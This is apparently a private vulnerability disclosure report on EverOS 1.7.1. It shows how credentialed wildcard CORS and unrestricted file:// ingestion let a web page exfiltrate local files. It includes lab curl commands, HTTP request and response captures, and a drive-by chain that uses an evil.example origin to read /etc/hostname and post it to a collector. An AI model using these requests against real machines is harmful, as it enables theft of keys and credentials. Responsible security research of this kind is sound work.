# EverOS 1.7.1 — Unauthenticated websites can exfiltrate arbitrary local files through the EverOS API

## Report metadata

| Field | Value |
|---|---|
| Target | EverOS 1.7.1 (Python/FastAPI), commit `e5778edb4cbac71e359ea375f38cf805aae32b0c` |
| Engagement | Disposable local lab: `127.0.0.1:18777`, root under `/tmp`, plus `127.0.0.1:18778` for the allowlist control. No external systems touched. |
| Generated (UTC) | 2026-11-20T15:37:25Z |
| Re-verified (UTC) | 2026-11-20T15:46:36Z |
| Status | FINAL |

## 1. Executive Summary

EverOS is a local-first agent-memory service. Its `SECURITY.md` declares "HTTP API exposure to untrusted network" out of scope and documents that the API has no built-in authentication. This report tests whether that threat model survives a browser: an arbitrary web page is not "the network", but it can issue credentialed requests to `127.0.0.1`.

Two independent defaults combine into full local-file exfiltration:

1. **Root cause A — unrestricted `file://` ingestion.** `POST /api/v2/memory/add` accepts a `ContentItem` with `uri: file:///...`. With the default `file_uri_allow_dirs = []`, any file readable by the EverOS process is hydrated, parsed, and its text is stored as `parsed_content` and returned by the search API.
2. **Root cause B — credentialed wildcard CORS.** CORS defaults are `allow_origins=["*"]` **and** `allow_credentials=True`. Starlette reflects every `Origin` and returns `Access-Control-Allow-Credentials: true`, so any website can call the unauthenticated API and read the responses.

Result, demonstrated end-to-end in a real browser: a victim visiting a malicious page has arbitrary local files (up to 50 MB per item) read by EverOS and exfiltrated to an attacker-controlled collector, and attacker-chosen memory written — with no prompt and no victim interaction beyond loading the page.

### 1.1 Attack chain

```text
Victim visits malicious website (http://evil.example:8000 — demonstrated)
          |
          v
Browser issues credentialed requests to 127.0.0.1:18777
          |
          v
CORS reflects Origin + Allow-Credentials: true  (root cause B)
          |
          v
POST /api/v2/memory/add  {"uri": "file:///etc/hostname", ...}
          |
          v
EverOS reads local file, stores parsed_content  (root cause A)
          |
          v
POST /api/v2/memory/search  -> parsed_content returned cross-origin
          |
          v
Attacker-controlled collector receives file contents
```

### 1.2 Prerequisites (all required)

- EverOS running locally with the HTTP API enabled (the documented deployment).
- The optional `[multimodal]` parser configured — required for `file://` hydration. Any client satisfying the `llm is not None` check suffices; for `ext: "txt"` the parser routes to `Modality.DIRECT` and decodes bytes inline with no LLM call. A dummy base URL was used in testing.
- Victim visits attacker-controlled content in a browser on the same machine.
- File size ≤ 50 MB and readable by the EverOS process (OS permissions still apply).

### 1.3 What was demonstrated vs. inferred

**Demonstrated (live, with artifacts):**

- Cross-origin preflight and data reads from `https://evil.example` over plain HTTP requests.
- Reflected `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials: true`, including for `Origin: null`.
- Full browser chain in headless Chromium 157 from a **non-loopback** origin `http://evil.example:8000` (via `--host-resolver-rules`): the page read `file:///etc/hostname`, obtained `teycir-G5-KF5`, and POSTed it to the collector. An earlier run from `http://127.0.0.1:8000` is also captured.
- Direct API file read of `/etc/hostname` with allowlist negative controls (configured allowlist, symlink, `..` traversal, `file://localhost/` all rejected; `/etc/shadow` unreadable → HTTP 500, no content).

**Not demonstrated (do not read as claims):**

- HTTPS origins were not tested; all browser evidence uses `http://` origins. HTTP origins are sufficient because the target API itself is plain HTTP on loopback — a secure-context HTTPS page can issue these requests, but that specific combination was not exercised.
- A `file://` HTML page attacking the API was not tested; `Origin: null` reflection is demonstrated at the HTTP layer only.
- No code execution, no authentication bypass (the API has none by design), and no access to files the EverOS process cannot read.

### 1.4 Risk Profile

| Severity | Count | Finding |
|---|---|---|
| High | 1 | F-01 (chained: file read + CORS) |

Overall risk: **High** — CVSS 3.1 **8.2**.

### 1.5 Recommendation Summary

| Priority | Action |
|---|---|
| P0 | Default `file_uri_allow_dirs` to deny-all when unset; require explicit opt-in directories; resolve symlinks before the check. |
| P0 | Default CORS to no origins and `allow_credentials=False`; require explicit allowlists. |
| P0 | Introduce authentication (per-instance bearer token) for all API routes; never rely on loopback binding as authorization. |
| P1 | Do not return `parsed_content` or content bytes in search/list DTOs; return references only. |
| P1 | Reject `Origin: null` and non-allowlisted origins before routing. |
| P2 | Run the parser as a lower-privilege worker with a restricted filesystem view. |

## 2. Scope & Methodology

- In-scope assets: local EverOS 1.7.1 instance built from the supplied repository; loopback ports 18777/18778 only.
- Constraints: disposable lab root under `/tmp`; non-destructive; no external systems contacted. The only writes were memory records in the disposable lab.
- Methodology: source review → configuration review → live exploitation → negative controls → browser verification → reporting.
- The two root causes were verified independently and then chained; controls were run against both the vulnerable default and a configured allowlist instance (port 18778).

## 3. Finding

### F-01 — Unauthenticated websites can exfiltrate arbitrary local files through the EverOS API

- **Severity:** High
- **CVSS 3.1:** 8.2 — `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` — https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
  - `UI:R` because the victim must load an attacker page; `S:C` because the browser security boundary is crossed to reach the local API; `I:L` accounts for attacker-controlled memory writes (context poisoning), which are demonstrated but secondary to the file read.
- **CWE:** CWE-73 (External Control of File Name or Path); CWE-942 (Permissive Cross-domain Policy); CWE-306 (Missing Authentication for Critical Function, contributing — the API is unauthenticated by documented design)
- **Affected URL/Area:** `POST /api/v1|v2/memory/add` (file ingestion), `POST /api/v1|v2/memory/search` (read-back); CORS applies to all `/api/v1/*` and `/api/v2/*` routes
- **Authentication required:** No (none exists)
- **User interaction required:** Yes — victim visits an attacker-controlled page
- **Prerequisites:** `[multimodal]` parser configured (see §1.2)
- **Verified at (UTC):** 2026-11-20T15:35:09Z (API captures), 2026-11-20T15:46:36Z (browser re-run from `http://evil.example:8000`)

#### Issue Description

**Root cause A — unrestricted `file://` ingestion.**
`ContentItemDTO` accepts `uri` for non-text items (`src/everos/entrypoints/api/schemas/memorize.py:33-44`). During ingest, `enrich_content_items` parses every non-text item and backfills `parsed_content` (`src/everos/memory/extract/parser/enrich.py`). The parser builder hydrates `file://` URIs from the host filesystem.

The only guard is `file_uri_allow_dirs`. Its default is an empty list (`src/everos/config/settings.py:598`), and the implementation treats empty as "allow any readable path". The size cap is 50 MB (`settings.py:601`). For plain text (`ext: "txt"`) the parser dispatches to `Modality.DIRECT` and UTF-8-decodes the bytes inline; no LLM call is made, but a configured `[multimodal]` client is required because `aparse_file` rejects `llm=None` — any placeholder client suffices.

The parsed content persists and is returned verbatim by the search endpoint (`UnprocessedMessageDTO.content[].parsed_content`).

**Root cause B — credentialed wildcard CORS.**
`app.py` installs `CORSMiddleware` with `allow_credentials=DEFAULT_CORS_ALLOW_CREDENTIALS` (`src/everos/entrypoints/api/app.py:63`). Defaults (`src/everos/entrypoints/api/middleware/cors.py:9,12`):

```
DEFAULT_CORS_ALLOW_CREDENTIALS = True
DEFAULT_CORS_ORIGINS = ["*"]
```

Starlette cannot satisfy wildcard + credentials literally, so it reflects the request `Origin` and sets `Access-Control-Allow-Credentials: true` — converting the wildcard into "allow every origin, with credentials". Combined with the intentionally absent API authentication, any web page can invoke the API with the victim's local privileges and read the responses.

**Secondary observation — no ownership binding on search.** The search endpoint does not enforce ownership based on the supplied `user_id`: a caller that knows a `session_id` can retrieve its buffered messages regardless of the `user_id` supplied. Since the API has no authentication by design, this is not an authentication bypass; it means session IDs are the only access control on buffered memory content.

#### Attack Scenario (demonstrated)

1. Victim runs EverOS locally with documented defaults plus `[multimodal]` configured, and visits `http://evil.example:8000/poc.html`.
2. Page JS sends `POST /api/v2/memory/add` with `Content-Type: application/json` and a `doc` item `{"uri": "file:///etc/hostname", "ext": "txt"}`. Preflight succeeds because the server reflects the origin and allows the header.
3. EverOS reads the file as the victim user, parses it, and stores it in the attacker-chosen session.
4. Page JS sends `POST /api/v2/memory/search` and reads `parsed_content` from the JSON response cross-origin.
5. Page JS POSTs the content to the attacker collector.

No authentication, CSRF token, origin restriction, or user prompt is involved beyond visiting the page.

#### Steps to Reproduce / PoC

Prerequisites: disposable EverOS root; `[llm]` and `[multimodal]` configured (dummy values suffice for `txt`); server on loopback.

1. Start the server (from the repository root; see `poc/setup_lab.sh` for the full lab setup):

```bash
cd <everos-repo>
EVEROS_LLM__API_KEY=sk-dummy EVEROS_LLM__BASE_URL=http://127.0.0.1:18999/v1 \
EVEROS_MULTIMODAL__API_KEY=sk-dummy EVEROS_MULTIMODAL__BASE_URL=http://127.0.0.1:18999/v1 \
uv run everos server start --root /tmp/opencode/everos-lab --port 18777
```

2. Submit a `file://` content item:

```bash
curl -s -X POST http://127.0.0.1:18777/api/v2/memory/add \
  -H 'Content-Type: application/json' -H 'Origin: http://evil.example:8000' \
  -d @poc/add_file_uri.json
```

3. Read the stored parsed bytes back:

```bash
curl -s -X POST http://127.0.0.1:18777/api/v2/memory/search \
  -H 'Content-Type: application/json' -H 'Origin: http://evil.example:8000' \
  -d @poc/search_readback.json
```

4. Or run the packaged PoC:

```bash
python3 poc/everos_file_read.py --file file:///etc/hostname --session final-poc-1
```

5. For the browser chain: serve `poc/driveby.html`, start `poc/exfil_listener.py`, and open the page from a non-loopback origin. The verified invocation used Chromium with `--host-resolver-rules='MAP evil.example 127.0.0.1'` and origin `http://evil.example:8000` (`poc/browser_driveby.sh`); an earlier loopback-origin run used `http://127.0.0.1:8000`.

#### Request

```http
POST /api/v2/memory/add HTTP/1.1
Host: 127.0.0.1:18777
Content-Type: application/json
Origin: http://evil.example:8000

{"session_id":"report-poc-1","messages":[{"sender_id":"u1","role":"user","timestamp":1795188909538,"content":[{"type":"doc","name":"hostname.txt","uri":"file:///etc/hostname","ext":"txt"}]}],"defer_extraction":true}
```

#### Response

```http
HTTP/1.1 200 OK
date: Fri, 20 Nov 2026 15:35:09 GMT
content-type: application/json
access-control-allow-origin: http://evil.example:8000
access-control-allow-credentials: true
x-request-id: 3460d9a6944949879ebc513a43e058ac

{"request_id":"3460d9a6944949879ebc513a43e058ac","data":{"message_count":1,"status":"accumulated"}}
```

Read-back response (excerpt):

```json
{
  "request_id": "c1e325480a864b23b9cf98dee989e3e4",
  "data": {
    "unprocessed_messages": [{
      "id": "m_report-poc-1_1795188909538_5c703457",
      "session_id": "report-poc-1",
      "sender_id": "u1",
      "content": [{
        "type": "doc",
        "uri": "file:///etc/hostname",
        "name": "hostname.txt",
        "ext": "txt",
        "parsed_content": "teycir-G5-KF5\n",
        "parse_status": "success"
      }],
      "timestamp": "2026-11-20T15:35:09.538000Z"
    }]
  }
}
```

#### Evidence artifacts

All captures are under `evidence/`; the complete SHA-256 manifest for the archive is `sha256sums.txt` at the archive root. Key items:

- `evidence/add.headers`, `evidence/add.body` — request acceptance and request ID.
- `evidence/search.headers`, `evidence/search.body` — leaked `parsed_content`.
- `evidence/poc_run.txt` — independent PoC re-run against `/etc/hostname`.
- `evidence/preflight.headers`, `evidence/preflight.body` — preflight reflection of `Origin` with credentials allowed.
- `evidence/search_cross_user.body`, `evidence/search_cross_user.headers` — session `victim-private-1` created as `sender_id: u1` was read with `user_id: "attacker"`; response contains `VICTIM-SECRET-4f9a2c`. Demonstrates that `session_id` alone is sufficient to read buffered messages.
- `evidence/origin_null.headers`, `evidence/origin_null.body` — `Origin: null` reflected as `access-control-allow-origin: null` with credentials (HTTP-layer demonstration only; a `file://` page attack was not tested).
- `evidence/browser_dom.txt`, `evidence/driveby_exfil.json`, `evidence/exfil_listener.log` — browser chain at 2026-11-20T15:39:14Z, headless Chromium 157, page origin `http://127.0.0.1:8000`, read `teycir-G5-KF5\n` from `http://127.0.0.1:18777`, POSTed 690 bytes to the collector on `:8899`.
- `evidence/browser_dom_evil.txt`, `evidence/driveby_exfil_evil.json`, `evidence/exfil_listener_evil.log` — hardened re-run at 2026-11-20T15:46:36Z from non-loopback origin `http://evil.example:8000`. Exfil records `"origin":"http://evil.example:8000"` and `"parsed":"teycir-G5-KF5\n"`; 854 bytes received.
- `evidence/add_allowlist_blocked.body` — control: with an allowlist configured, `/etc/hostname` is rejected (HTTP 415).
- `evidence/search_allowed_canary.body` — control: a file inside the allowed root is parsed (`ALLOWED-CANARY-9d2f`).
- `evidence/add_allowlist_symlink_etc.body`, `evidence/add_allowlist_symlink_out.body`, `evidence/add_allowlist_dotdot.body`, `evidence/add_allowlist_localhost.body` — guard controls: with an allowlist set, symlink to `/etc/hostname`, symlink outside the root, `..` traversal, and `file://localhost/...` are all rejected (HTTP 415). `Path.resolve(strict=True)` plus `is_relative_to` holds.
- `evidence/add_unreadable.body`, `evidence/add_unreadable.status` — negative control: `/etc/shadow` yields HTTP 500, no content.
- `evidence/search_unknown_session.body` — control: unknown session returns an empty list.
- `evidence/config_defaults.txt` — `file_uri_allow_dirs` default `[]`.
- `evidence/cors_defaults.txt` — wildcard origin + credentials default.
- `evidence/git_head.txt` — audited commit.
- `evidence/captured_at.txt` — capture timestamps.

#### Impact

An attacker who can get a victim to load a page can read any file the EverOS process can access, up to 50 MB per item, subject only to OS permissions — SSH private keys, cloud credentials, shell history, source code, application configuration. The victim's files are exfiltrated without any prompt. Integrity impact is limited to attacker-controlled memory writes that can steer later agent behavior (context poisoning); no code execution was demonstrated. Confidentiality impact is high.

#### Affected Demographic

Operators running EverOS locally with the HTTP API and the multimodal parser enabled — developers and agent users on laptops/workstations, i.e. the primary user base of a local-first memory product.

#### Recommended Fix

- Change the `file_uri_allow_dirs` default to deny: when empty, reject all `file://` URIs; require explicit opt-in directories.
- Resolve real paths and symlinks before the allowlist check; compare path components, not string prefixes.
- Do not hydrate `file://` from the API request path; restrict host-file ingestion to a local CLI/import command.
- Set `DEFAULT_CORS_ORIGINS = []` and `DEFAULT_CORS_ALLOW_CREDENTIALS = False`; require both to be configured explicitly.
- If a browser UI is needed, bind an exact-origin allowlist and add a per-instance bearer token that the UI must present; never rely on loopback binding as authorization.
- Reject `Origin: null`; do not reflect arbitrary origins.
- Introduce authentication for the API and enforce `session_id`/`user_id` ownership server-side; add a CSRF-style required header on mutating routes.
- Do not return `parsed_content` in search/list DTOs; return references only.
- Defense in depth: run the parser as a separate unprivileged worker with a restricted filesystem view.

#### References

- CWE-73: https://cwe.mitre.org/data/definitions/73.html
- CWE-942: https://cwe.mitre.org/data/definitions/942.html
- CWE-306: https://cwe.mitre.org/data/definitions/306.html
- OWASP WSTG — Testing for Path Traversal: https://owasp.org/www-project-web-security-testing-guide/
- Fetch Living Standard — CORS protocol: https://fetch.spec.whatwg.org/#http-cors-protocol

## 4. Appendix

### 4.1 Evidence inventory

The archive contains the full SHA-256 manifest (`sha256sums.txt`, 49 entries) covering `report.md`, all of `evidence/`, and all of `poc/`. The table below lists the primary artifacts; verify any file with `sha256sum -c sha256sums.txt`.

| Path | SHA256 |
|---|---|
| `evidence/add.headers` | `c326e1a2fa86eadafb84d0aa7e00c08376d031df532b8f2eabc8a1d25dce86e1` |
| `evidence/add.body` | `ee626c7730b507040380b35249d31d5870b7aa4db5fe8153b31759f1fac527b8` |
| `evidence/search.headers` | `ea3b5305e545cf138924ebe1698004ba12da9350616ecc8997aa7d564c66bd7d` |
| `evidence/search.body` | `b77c4ac65839fc98dc2028640a080bd68dcea9e9e0004041f9bfedb4d484b386` |
| `evidence/preflight.headers` | `5c5e530593d0a073f0b584f82a1456ddb83fd31d515130c28beefb262e06ca49` |
| `evidence/preflight.body` | `565339bc4d33d72817b583024112eb7f5cdf3e5eef0252d6ec1b9c9a94e12bb3` |
| `evidence/search_unknown_session.body` | `5d951f183c7d955d60095977128475569cec880b17a8e72c23932c6d15e64d1a` |
| `evidence/add_unreadable.body` | `c18182b8b66a90a40bc477eecc9800583ad1b47f77f2fed024bb193fa393c677` |
| `evidence/add_unreadable.status` | `0604cd3138feed202ef293e062da2f4720f77a05d25ee036a7a01c9cfcdd1f0a` |
| `evidence/add_allowlist_blocked.body` | `2e383fba99b0277f6b01c39ee374d850bfdb94e16ab12ed4912b4c575f341021` |
| `evidence/search_allowed_canary.body` | `b3787aa47b2cc853d52e5611a15765b124d12454439abbf4b950a7fa3241eb31` |
| `evidence/config_defaults.txt` | `b51ba228ced60b2b3dbba9cae41d83a0937b13226c5c729d20fa2186c5ad3c84` |
| `evidence/cors_defaults.txt` | `6cd8342b6a2c1814cbbda252ba5d71b06ecb40fb4341797f8fc14b24dac700d6` |
| `evidence/git_head.txt` | `ae08bd8b7733880465a34a5c38907299e337f72aabafd51565a482445ff9f7c5` |
| `evidence/poc_run.txt` | `b59b6bbad15fe4aeb181b7d453ea96f8c6709a499bbd33556a3152e7d1165abe` |
| `evidence/browser_dom.txt` | `47e279ec51d2023e2d83a7cd6b067ade521a0250c9ec7cdfceae3f8b931a0f84` |
| `evidence/browser_chrome.log` | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` |
| `evidence/exfil_listener.log` | `a05095936e855c77298a37fa8f505f742e2ea2bd61a7e594418a837023d6d669` |
| `evidence/driveby_exfil.json` | `2227ea828e8a4a43ac8cda795ad92c8f084a1e453363865c45acc4056969568e` |
| `evidence/browser_dom_evil.txt` | `46c18664e550c6bacfef49fbbeb51844fa34ddc4bc72755cd3d742eb3a248ef6` |
| `evidence/browser_evil.log` | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` |
| `evidence/exfil_listener_evil.log` | `1ed775b61428e7ab3783301a304b4249e354b36c1e3305d92855e8434da11c42` |
| `evidence/driveby_exfil_evil.json` | `ed9fa620917fa3f54366cb538687e9a24e012261cbbcf392def2828ef48b5571` |
| `evidence/search_cross_user.body` | `46e6aa1d772ee11a15258b1c5f9929400c319dd8356dc9959230e169307a7f1a` |
| `evidence/search_cross_user.headers` | `ac852a4a2f792f7a3112e0abbd08664f91e2c648203ea5cc955d1d9a821feb7d` |
| `evidence/origin_null.headers` | `04fe3506fa7e142c3eec62da2ee88bbffc962779d0b1f316c93d31c26033563d` |
| `evidence/origin_null.body` | `ca895b10b18a06fa14accfe7241432b601caac1cb146876cf900ce227d05fcff` |
| `evidence/add_allowlist_symlink_etc.body` | `784625b06f9e26298843ca7be1f772f3453216bdc47f9750a5bef1cbf552e3c3` |
| `evidence/add_allowlist_symlink_out.body` | `7478ad089a887585e26a053f3716b04a6a550157060fed231432c0964d943b8e` |
| `evidence/add_allowlist_dotdot.body` | `7300c5f0de27f53694c27b6503070362f0250614ca5a3b1c66e319316e91b9fc` |
| `evidence/add_allowlist_localhost.body` | `d153b99f4b77ad71495107f26ca58aca4f7ea986a455fa67866cce5f9e1f8fd6` |
| `evidence/captured_at.txt` | `445db7267753c37f74b40c784cc2ceec9e8ddfab970dff5b3e53e78afb78c988` |
| `poc/everos_file_read.py` | `2e523557a1e8bb4c079fd777960a8addab4fafa7102c6602e0a73263702fdae3` |
| `poc/driveby.html` | `1844e7f06c188a9d2aefd849f3a1cd24df1f0530c0b7cd67956b5b86ee30adde` |
| `poc/exfil_listener.py` | `65e8cce55440d1ac7b60c135e4e1afb0c2bae95a21b4b273fc295c11c423b824` |
| `poc/browser_driveby.sh` | `9c59323287bd6e66edb19e57740df98ed007919ed558295e7a8c87c391884ad7` |
| `poc/setup_lab.sh` | `9fb01f70f7eae9c0eb6a1dbb894446221804d8a965bb5720f2f31bf99d0321d8` |
| `poc/exploit.py` | `770eb292921138403ba9c692f020258cd575f35129e5454ece713a43c3787583` |
| `poc/add_file_uri.json` | `1107765f4d69ccd46e2f7830fe05a9aec8529058ce3ce6cbbac7c8cdaa9e9a72` |
| `poc/search_readback.json` | `b636791832122eed7d230da33ad73de360e618d70924c7ed3d9bd71fb3a1b43f` |
| `poc/add_unreadable.json` | `d388730137709f8337849cef8e2c0fa24894a84de775ed3b998ac912a0b84a33` |
| `poc/search_unknown_session.json` | `078693ecb750af09d6c8c46f81e1458fbf459edb3a9f7b643c9ed55dd4214777` |
| `poc/exfil/20261120T161300Z-4.json` | `55dada7203ce46b0af4b2431117c68783266e1f59104ea42a1bcd6af68966ae4` |
| `poc/exfil/dom.html` | `46c18664e550c6bacfef49fbbeb51844fa34ddc4bc72755cd3d742eb3a248ef6` |
| `poc/exfil/listener.log` | `594d9de0c1c3181e6a0dafeff654d7931653b6d27d5c3c9c9f4a6ae188860959` |
| `poc/exfil/web.log` | `592945cd75a83e84aeb4ce2b0fa18df2677e22942620de1f67ab77f17db2a8f5` |
| `poc/exfil/chrome.log` | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` |

### 4.2 Tools used

- EverOS 1.7.1 (`uv run everos server start`), Python 3.12.3.
- `curl` 8.5.0 (libcurl/OpenSSL 3.0.13).
- Headless Chromium 157 (Playwright-driven via `poc/browser_driveby.sh`).
- `sha256sum`, `git`.
- PoC scripts in `poc/` are self-contained (urllib + http.server).

### 4.3 Falsified / refuted items

- **"Wildcard CORS is harmless because the API is loopback-only."** Refuted: the response reflects arbitrary origins and allows credentials; a browser page can read responses. Verified live.
- **"`file://` read requires a fully working multimodal LLM."** Refuted for `txt`: the parser routes to `Modality.DIRECT` and decodes bytes without any LLM call; only a non-`None` client is required to pass the wrapper check. Verified with a dummy base URL and real file content returned.
- **"The allowlist fully prevents host reads."** Partially refuted as a default claim: the guard works when set (control: `/etc/hostname` rejected, allowed canary parsed), but the default empty list allows any readable path.
- **"Unreadable files leak via error."** Refuted: `/etc/shadow` returned a generic HTTP 500 with no content.
- **"Search requires the correct user_id."** Refuted: with `user_id: attacker`, the response still returned a row whose `sender_id` was `u1` when the session ID matched.
- **"Symlink/traversal escapes the allowlist."** Refuted when the allowlist is set: symlink to `/etc/hostname`, symlink to a file outside the root, `..` traversal, and `file://localhost/...` all returned HTTP 415. The default empty allowlist remains the finding.
- **"HTTPS origin was tested in the browser."** Not claimed: browser evidence uses `http://evil.example:8000` and `http://127.0.0.1:8000`. The API is plain HTTP on loopback; HTTPS pages can issue these requests but that combination was not exercised.
- **"A `file://` page can attack the API."** Not claimed: `Origin: null` reflection is demonstrated at the HTTP layer only.
- **"The multimodal parser is on by default."** Not claimed: it is an optional feature; the report lists it as a prerequisite.

### 4.4 Limitations

- Tested against a single version (1.7.1, commit `e5778edb`) in a local lab; no production deployment was touched.
- File read is bounded by the EverOS process's OS permissions and the 50 MB per-item cap.
- Memory-write integrity impact (agent context poisoning) was reasoned about but not exercised against a live agent loop.
- Binary/non-text formats were not tested; all demonstrations used `ext: "txt"` (`Modality.DIRECT`).

### 4.5 Disclosure

Reported privately to the vendor. No public disclosure until a fix is released or the agreed coordinated-disclosure window elapses.

---

*Report generated 2026-11-20. Evidence captures are timestamped UTC; verify integrity with `sha256sums.txt`.*
